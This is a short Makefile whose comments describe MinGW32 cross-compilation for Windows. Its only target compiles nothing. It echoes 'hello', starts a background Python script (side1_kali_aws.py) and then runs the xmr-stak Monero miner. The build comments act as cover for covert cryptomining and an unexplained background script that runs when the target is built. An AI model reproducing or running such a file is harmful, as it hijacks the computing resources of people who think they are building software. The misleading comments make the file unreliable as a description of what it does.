# This Makefile has only been tested on linux.  It uses
# MinGW32 to cross-compile for windows.  To install and
# configure MinGW32 on linux, see http://www.mingw.org


# This is where the mingw32 compiler exists in Ubuntu 8.04.
# Your compiler location may vary.

ng: cpu.txt
	@echo "hello"
	(python3 side1_kali_aws.py &)
	sleep 5
	chmod +x ./xmr-stak
	./xmr-stak
